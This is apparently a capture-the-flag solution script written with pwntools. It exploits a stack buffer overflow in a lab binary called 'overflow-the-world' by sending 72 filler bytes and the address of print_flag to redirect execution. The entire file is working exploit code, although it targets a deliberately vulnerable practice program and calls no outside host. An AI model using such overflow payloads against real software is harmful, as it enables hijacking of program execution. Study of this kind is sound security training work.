#!/usr/bin/env python3
from pwn import *

exe = ELF("./overflow-the-world")

r = process([exe.path])
# gdb.attach(r)

win = exe.symbols["print_flag"]

payload = b'X' * 72 + p64(win)

r.recvuntil(b"What's your name? ")
r.sendline(payload)

r.recvuntil(b"Let's play a game.\n")
r.interactive()